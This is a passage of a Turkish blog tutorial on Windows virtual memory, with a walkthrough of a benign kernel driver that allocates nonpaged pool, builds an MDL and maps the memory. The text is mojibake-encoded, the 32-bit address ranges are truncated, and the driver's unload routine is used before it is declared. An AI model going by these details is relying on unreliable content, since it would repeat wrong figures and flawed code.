dÃ¼zenine baÄŸlÄ± kalmaksÄ±zÄ±n, belleÄŸin daha soyut bir gÃ¶rÃ¼nÃ¼mÃ¼nÃ¼ sunar. Ã‡alÄ±ÅŸma sÄ±rasÄ±nda, bellek yÃ¶neticisi -donanÄ±m desteÄŸi ile- sanal adresleri verilerin gerÃ§ekten saklandÄ±ÄŸÄ± fiziksel adreslere Ã§evirir. Bu sayede, iÅŸletim sistemi her bir processâ€™in, diÄŸer bir processâ€™in belleÄŸine mÃ¼dahale etmesini veya iÅŸletim sisteminin kritik verilerinin Ã¼zerine yazÄ±lmasÄ±nÄ± engelleyebilir.\"\nâ€“Windows Internals Part 1 - Chapter 1, Page 39\nYukarÄ±daki kaynaÄŸa gÃ¶re kÄ±saca Virtual Memory (Sanal Bellek), fiziksel bellek adresindeki verilerin ldealleÅŸtirilmiÅŸ bir soyutlama saÄŸlayan bir bellek yÃ¶netim tekniÄŸidir. Bu sayede iÅŸletim sistemi her bir processâ€™in, diÄŸer process belleÄŸine mÃ¼dahale etmesini veya iÅŸletim sisteminin kritik verilerinin Ã¼zerine yazÄ±lmasÄ±nÄ± engelleyebilir.\nBu sistem, verileri bellekte (RAM) ve sabit diskte (hard disk) saklamak iÃ§in bir yÃ¶ntem kullanÄ±r. Bu yÃ¶ntem, verileri kÃ¼Ã§Ã¼k parÃ§alara bÃ¶ler. Her bir parÃ§a â€˜pageâ€™ (sayfa) olarak adlandÄ±rÄ±lÄ±r ve genellikle 4 KB boyutundadÄ±r.\nBu sayfalar, bellekte bitiÅŸik olarak saklanmak zorunda deÄŸildir. Yani, bir uygulamanÄ±n verileri bellekte dÃ¼zensiz bir ÅŸekilde yer alabilir. Ã–rneÄŸin, bir uygulamanÄ±n bazÄ± verileri bellekte bulunurken, bazÄ±larÄ± diskte saklanabilir. Bu yÃ¶ntem, uygulamanÄ±n performansÄ±nÄ± etkilemeden bellek kullanÄ±mÄ±nÄ± optimize etmesini saÄŸlar.\nBu sistemin avantajÄ±, uygulamalarÄ±n sayfalamadan yararlanmak iÃ§in herhangi bir Ã¶zel deÄŸiÅŸiklik yapmasÄ±na gerek olmamasÄ±dÄ±r. Bellek yÃ¶netim sistemi, bu iÅŸlemleri otomatik olarak yapar. AÅŸaÄŸÄ±daki ÅŸemada bunu daha iyi gÃ¶rebilirsiniz.\nWindows Internals - Part 1, Page 40\rSanal adres alanÄ±nÄ±n boyutu her donanÄ±m platformuna gÃ¶re deÄŸiÅŸiklik gÃ¶sterir. Ã–rneÄŸin Windowsâ€™ta 32-bit x86 sistemlerde toplam sanal adres alanÄ± en fazla 4 GBâ€™dÄ±r. Yine bu platformda varsayÄ±lan olarak, Windows bu adres alanÄ±nÄ±n alt yarÄ±sÄ±nÄ± (0x00000000 - 0x7FFFFF arasÄ± adresler) kendi Ã¶zel depolama alanlarÄ±nÄ± ve Ã¼st yarÄ±sÄ±nÄ± (0x80000000 - 0xFFFFFF arasÄ± adresler) kendi korumalÄ± iÅŸletim sistemi bellek kullanÄ±mÄ± iÃ§in ayÄ±rÄ±r.\nWindowsâ€™ta 64-bit (x64) sistemlerde ise sanal adres alanÄ± Ã§ok daha geniÅŸtir. 64-bit bir adresleme sistemi teorik olarak 16 exabyte (2^64 bayt) sanal adres alanÄ± sunar. Ancak, mevcut donanÄ±m ve iÅŸletim sistemi kÄ±sÄ±tlamalarÄ± nedeniyle bu alanÄ±n tamamÄ± kullanÄ±lmaz. Windows x64 iÅŸletim sistemlerinde genellikle sanal adres alanÄ± 256 terabyte (2^48 bayt) ile sÄ±nÄ±rlÄ±dÄ±r.\nCode Bu etapta, sÃ¼rÃ¼cÃ¼ Ã¼zerinden kernel space alanÄ±ndan bir bellek ayrÄ±mÄ± yapÄ±p ardÄ±ndan bu belleÄŸi sanal adres ile eÅŸleÅŸtireceÄŸiz.\nGithub linki iÃ§in buraya tÄ±klayabilirsiniz.\n#pragma warning(disable: 4996) #include \u003cntddk.h\u003e NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { UNREFERENCED_PARAMETER(RegistryPath); SIZE_T MemorySize = 0x1000; PVOID VirtualAddress = NULL; PVOID MappedAddress = NULL; PMDL MDL = NULL; VirtualAddress = ExAllocatePool(NonPagedPool, MemorySize); if (NULL == VirtualAddress) { DbgPrintEx(0, 0, \"Bellek Ayrimi basarisiz oldu!\\n\"); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Ayrilan Bellek Adresi: 0x%p\\n\", VirtualAddress); MDL = IoAllocateMdl(VirtualAddress, (ULONG)MemorySize, FALSE, FALSE, NULL); if (NULL == MDL) { DbgPrintEx(0, 0, \"MDL Ayrimi basarisiz oldu!\\n\"); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } MmBuildMdlForNonPagedPool(MDL); MappedAddress = MmMapLockedPagesSpecifyCache(MDL, KernelMode, MmCached, NULL, FALSE, NormalPagePriority); if (NULL == MappedAddress) { DbgPrintEx(0, 0, \"Sanal Adres esleme basarisiz!\\n\"); IoFreeMdl(MDL); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Sanal Adres esleme basarili! Adres: 0x%p\\n\", MappedAddress); MmUnmapLockedPages(MappedAddress, MDL); IoFreeMdl(MDL); ExFreePool(VirtualAddress); DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; } NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { UNREFERENCED_PARAMETER(DriverObject); DbgPrintEx(0, 0, \"Driver Unloaded\\n\"); return STATUS_SUCCESS; } Ã–rnek kod parÃ§amÄ±z bu. Åimdi bu kodu inceleyelim.\nSIZE_T MemorySize = 0x1000; PVOID VirtualAddress = NULL; PVOID MappedAddress = NULL; PMDL MDL = NULL; Ä°lk olarak sÃ¼rÃ¼cÃ¼mÃ¼zde parametreleri tanÄ±mlayarak baÅŸlÄ±yoruz. Ä°ÅŸte sÄ±rasÄ±yla amaÃ§larÄ±:\nMemorySize: Bellek ayrÄ±mÄ± yapÄ±lacak alanÄ±n boyutunu belirler. Bu Ã¶rnekte 0x1000 (4 KB) olarak belirledim. VirtualAddress: Bellek ayrÄ±mÄ± yapÄ±ldÄ±ÄŸÄ±nda dÃ¶nen adresi tutar. MappedAddress: BelleÄŸin sanal adres ile eÅŸleÅŸtirildiÄŸi adresi tutar. MDL: BelleÄŸin sanal adres ile eÅŸleÅŸtirilmesi iÃ§in kullanÄ±lan MDL yapÄ±sÄ±nÄ± tutar. VirtualAddress = ExAllocatePool(NonPagedPool, MemorySize); if (NULL == VirtualAddress) { DbgPrintEx(0, 0, \"Bellek Ayrimi basarisiz oldu!\\n\"); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Ayrilan Bellek Adresi: 0x%p\\n\", VirtualAddress); Ä°lk adÄ±mÄ±mÄ±zda Nonpaged Pool alanÄ±ndan 4 KBâ€™lÄ±k bir bellek ayrÄ±mÄ± yapÄ±yoruz. EÄŸer bellek ayrÄ±mÄ± baÅŸarÄ±sÄ±z olursa, hata mesajÄ± yazdÄ±rÄ±p iÅŸlemi sonlandÄ±rÄ±yoruz. AyrÄ±ca baÅŸarÄ±lÄ± olursa, ayrÄ±lan belleÄŸin adresini yazdÄ±rÄ±yoruz.\nEÄŸer Nonpaged havuzu hakkÄ±nda bilginiz yoksa burada bir kÄ±sa aÃ§Ä±klama yapayÄ±m. Nonpaged Pool, iÅŸletim sisteminde kullanÄ±lan bellek havuzlarÄ±ndan biridir. Bu havuz, sistemin her zaman eriÅŸilebilir olan ve disk belleÄŸi ile deÄŸiÅŸtirilemeyen (yani â€œpagingâ€ iÅŸlemi uygulanamayan) bellek alanÄ±nÄ± ifade eder. Nonpaged pool iÃ§indeki bellek, sistemde kritik Ã¶neme sahip iÅŸler iÃ§in ayrÄ±lÄ±r. Ã–rneÄŸin, donanÄ±m sÃ¼rÃ¼cÃ¼leri veya Ã§ekirdek (kernel) modundaki diÄŸer bileÅŸenler, bu havuzdan bellek tahsis ederler Ã§Ã¼nkÃ¼ bu bileÅŸenlerin bellek eriÅŸiminin her zaman hÄ±zlÄ± ve kesintisiz olmasÄ± gerekir.\nBunun yanÄ±nda Paged Pool alanÄ± vardÄ±r. Bu da iÅŸletim sisteminde kullanÄ±lan bellek havuzlarÄ±ndan biridir. Bu havuz, sistemin bellek yÃ¶netimi iÃ§in kullanÄ±lan ve disk belleÄŸi ile deÄŸiÅŸtirilebilen (yani â€œpagingâ€ iÅŸlemi uygulanabilen) bellek alanÄ±nÄ± ifade eder. Paged pool iÃ§indeki bellek, genellikle kullanÄ±cÄ± modunda Ã§alÄ±ÅŸan uygulamalar ve hizmetler iÃ§in ayrÄ±lÄ±r.\nMDL = IoAllocateMdl(VirtualAddress, (ULONG)MemorySize, FALSE, FALSE, NULL); if (NULL == MDL) { DbgPrintEx(0, 0, \"MDL Ayrimi basarisiz oldu!\\n\"); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } Kodun devamÄ±nda ise, bellek bloÄŸunun fiziksel adreslerine eriÅŸmek ve bu bloÄŸu bir sanal adres ile eÅŸleÅŸtirmek iÃ§in bir MDL (Memory Descriptor List) yapÄ±sÄ± oluÅŸturuyoruz. MDL yapÄ±sÄ±, belleÄŸin fiziksel adreslerini ve boyutunu tutar, bÃ¶ylece bu blokla iliÅŸkili verilerin sanal bellekten fiziksel belleÄŸe nasÄ±l eÅŸleÅŸtirileceÄŸini tanÄ±mlar.\nMmBuildMdlForNonPagedPool(MDL); Daha sonra bÄ± API ile MDL yapÄ±sÄ±nÄ± oluÅŸturuyoruz. Bu fonksiyon, MDL yapÄ±sÄ±nÄ± oluÅŸtururken, MDL yapÄ±sÄ±nÄ±n fiziksel bellek adreslerini ve boyutunu doldurur.\nMappedAddress = MmMapLockedPagesSpecifyCache(MDL, KernelMode, MmCached, NULL, FALSE, NormalPagePriority); if (NULL == MappedAddress) { DbgPrintEx(0, 0, \"Sanal Adres esleme basarisiz!\\n\"); IoFreeMdl(MDL); ExFreePool(VirtualAddress); return STATUS_INSUFFICIENT_RESOURCES; } DbgPrintEx(0, 0, \"Sanal Adres esleme basarili! Adres: 0x%p\\n\", MappedAddress); Son olarak belleÄŸimizi sanal adresle eÅŸlemek iÃ§in MmMapLockedPagesSpecifyCache API kullanÄ±yoruz. Bu fonksiyon, MDL yapÄ±sÄ±nÄ± kullanarak belirtilen bellek bloÄŸunu sanal belleÄŸe eÅŸler. EÄŸer iÅŸlem baÅŸarÄ±sÄ±z olursa, hata mesajÄ± yazdÄ±rÄ±p iÅŸlemi sonlandÄ±rÄ±yoruz. BaÅŸarÄ±lÄ± olursa, eÅŸlenen belleÄŸin adresini yazdÄ±rÄ±yoruz.\nMmUnmapLockedPages(MappedAddress, MDL); IoFreeMdl(MDL); ExFreePool(VirtualAddress); DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; Son olarak, iÅŸimiz bittiÄŸinde belleÄŸi serbest bÄ±rakÄ±yoruz. Bu iÅŸlemi yaparken, Ã¶nce MmUnmapLockedPages fonksiyonunu kullanarak sanal belleÄŸi serbest bÄ±rakÄ±yoruz. Daha sonra IoFreeMdl fonksiyonu ile MDL yapÄ±sÄ±nÄ± serbest bÄ±rakÄ±yoruz.\nSÃ¼rÃ¼cÃ¼nÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± GÃ¶rÃ¼ldÃ¼ÄŸÃ¼ gibi, sÃ¼rÃ¼cÃ¼yÃ¼ Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda baÅŸarÄ±yla ayrÄ±lan bellek adresi ve eÅŸlenen sanal bellek adresini windbg Ã¼zerinden gÃ¶rebiliyoruz:\nSonuÃ§ Bu yazÄ±da, Virtual Memory konusunu ele aldÄ±m. UmarÄ±m faydalÄ± olmuÅŸtur.\nÄ°yi Ã§alÄ±ÅŸmalar dilerim ğŸš€ğŸš€\nReferences Windows Internals Part 1 - Chapter 1, Virtual Memory (PAGE 39- 41) EN Wikipedia - Virtual Memory ","sonuÃ§#SonuÃ§":"","sÃ¼rÃ¼cÃ¼nÃ¼n-Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±#SÃ¼rÃ¼cÃ¼nÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±":"","virtual-memory-nedir#Virtual Memory Nedir?":""},"title":"Virtual Memory"}}